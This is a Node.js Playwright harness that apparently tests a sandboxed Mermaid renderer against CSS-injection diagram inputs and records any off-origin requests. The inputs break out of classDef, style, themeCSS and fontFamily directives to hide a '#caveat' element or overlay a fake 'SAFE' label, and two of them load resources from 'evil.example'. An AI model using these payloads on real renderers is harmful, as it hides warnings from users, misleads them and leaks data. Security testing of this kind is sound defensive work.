import { spawn } from 'node:child_process';
import { chromium } from '/home/r/Documents/MyStuff/random_ts/visser/node_modules/playwright/index.mjs';
const server = spawn(process.execPath, ['serve.mjs', '4701'], { stdio: 'ignore' });
await new Promise((r) => setTimeout(r, 400));
const b = await chromium.launch();
const page = await b.newPage();
const offOrigin = [];
await page.route('**/*', (r) => { const u = new URL(r.request().url()); if (u.origin !== 'http://127.0.0.1:4701' && !u.protocol.startsWith('data')) { offOrigin.push(u.href); return r.abort(); } return r.continue(); });
await page.goto('http://127.0.0.1:4701/');
await page.waitForFunction(() => window.__ready === true);
const cases = {
  baseline: 'flowchart LR\n  a[A] --> b[B]',
  classDefBreak: 'flowchart LR\n  a[A] --> b[B]\n  classDef x fill:red;}body{display:none\n  class a x',
  classDefBreak2: 'flowchart LR\n  a[A] --> b[B]\n  classDef x fill:red} #caveat{display:none} .y{fill:red\n  class a x',
  styleBreak: 'flowchart LR\n  a[A] --> b[B]\n  style a fill:#f00,stroke:#000;} * {color:transparent',
  styleBreak2: 'flowchart LR\n  a[A] --> b[B]\n  style a fill:#f00;}#caveat{visibility:hidden',
  linkStyleBreak: 'flowchart LR\n  a[A] --> b[B]\n  linkStyle 0 stroke:red;}#caveat{display:none',
  styleFixedOverlay: 'flowchart LR\n  a[A] --> b[B]\n  style a position:fixed,top:0,left:0,width:100vw,height:100vh,fill:#fff',
  classDefFixed: 'flowchart LR\n  a["SAFE: no data loss"] --> b[B]\n  classDef x position:fixed,top:0,left:0,font-size:40px\n  class a x',
  styleUrlExfil: 'flowchart LR\n  a[A] --> b[B]\n  style a fill:url(https://evil.example/x.png)',
  styleBgImport: 'flowchart LR\n  a[A] --> b[B]\n  classDef x fill:red;}@import url(https://evil.example/a.css);.z{fill:red\n  class a x',
  stateClassDef: 'stateDiagram-v2\n  [*] --> A\n  classDef bad fill:red;}#caveat{display:none\n  class A bad',
  labelStyleTag: 'flowchart LR\n  a["<style>#caveat{display:none}</style>x"] --> b[B]',
  labelInlineStyle: 'flowchart LR\n  a["<span style=\\"position:fixed;top:0;left:0;font-size:60px;background:#fff\\">SAFE</span>"] --> b[B]',
  themeCssInit: '%%{init: {"themeCSS": "#caveat{display:none} body{background:red}"}}%%\nflowchart LR\n  a[A] --> b[B]',
  themeVarsFront: '---\nconfig:\n  themeCSS: "#caveat{display:none}"\n  themeVariables:\n    primaryColor: "red;}#caveat{display:none"\n---\nflowchart LR\n  a[A] --> b[B]',
  fontFamilyInit: '%%{init: {"fontFamily": "x;}#caveat{display:none}.q{a:b"}}%%\nflowchart LR\n  a[A] --> b[B]',
};
const out = {};
for (const [k, v] of Object.entries(cases)) out[k] = await page.evaluate((t) => window.runCase(t), v);
out.offOrigin = offOrigin;
console.log(JSON.stringify(out, null, 1));
await b.close(); server.kill();
